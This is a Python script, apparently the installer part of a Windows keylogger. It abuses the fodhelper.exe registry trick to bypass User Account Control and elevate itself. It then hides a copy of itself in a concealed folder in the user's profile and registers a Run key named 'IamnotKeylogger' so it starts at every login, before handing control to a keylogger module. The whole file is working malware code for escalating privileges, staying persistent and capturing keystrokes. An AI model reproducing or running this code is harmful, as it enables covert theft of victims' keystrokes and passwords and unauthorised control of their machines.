import os, sys, ctypes, winreg
import keylogger
from getpass import getuser
from shutil import copy
from time import sleep

WINS_CMD                = r'C:\Windows\System32\cmd.exe'
FOD_HELPER              = r'C:\Windows\System32\fodhelper.exe'
PYTHON_CMD              = 'python'
CLASSES_REG_PATH        = r'Software\Classes\ms-settings\shell\open\command'
SOFTWARE_REG_PATH       = r'Software\Microsoft\Windows\CurrentVersion\Run'
DELEGATE_EXEC_REG_KEY   = 'DelegateExecute'
KEYLOGGER_REG_KEY       = 'IamnotKeylogger'
RUNNING_MODE            = 2     # 1: run by python.exe. 2: run as a standalone program
RUNNING_VALUE           = __file__ if RUNNING_MODE == 1 else sys.executable

# Check if a user has admin rights
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Create a reg key
def create_reg_key(reg_path, key, value):
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
    except WindowsError:
        raise

# Try to bypass the UAC
def bypass_uac(cmd):
    try:
        create_reg_key(CLASSES_REG_PATH, DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(CLASSES_REG_PATH, None, cmd)
    except WindowsError:
        raise

# Copy exec file to this folder
def run_bypass_uac(exec_path):
    if not os.path.exists(exec_path):
        if not is_admin():
            # The script is NOT running with administrative privileges
            try:
                current_dir = RUNNING_VALUE
                if RUNNING_MODE == 1:
                    cmd = '%s /k %s %s' %(WINS_CMD, PYTHON_CMD, current_dir)
                else:
                    cmd = '%s /k %s' %(WINS_CMD, current_dir)

                # Trying to bypass the UAC
                bypass_uac(cmd)
                os.system(FOD_HELPER)
                sleep(1)
            except WindowsError:
                os.system('TASKKILL /F /IM %s' %(os.path.basename(WINS_CMD)))
                sys.exit(1)

        else:
            # The script is running with administrative privileges
            value = r'"%s\%s" /background' %(exec_path, os.path.basename(RUNNING_VALUE))
            print(value)
            create_reg_key(SOFTWARE_REG_PATH, KEYLOGGER_REG_KEY, value)
            os.system('TASKKILL /F /IM %s' %(os.path.basename(WINS_CMD)))
            sys.exit(0)

        os.makedirs(exec_path)
        os.system('attrib +h ' + exec_path)
        copy(RUNNING_VALUE, exec_path)

# Main handle
def execute():
    user_name = getuser()
    exec_path = r'C:\Users\%s\IamnotKeylogger' %(user_name)
    run_bypass_uac(exec_path)
    keylogger.run(exec_path)

# Test
if __name__ == '__main__':
    execute()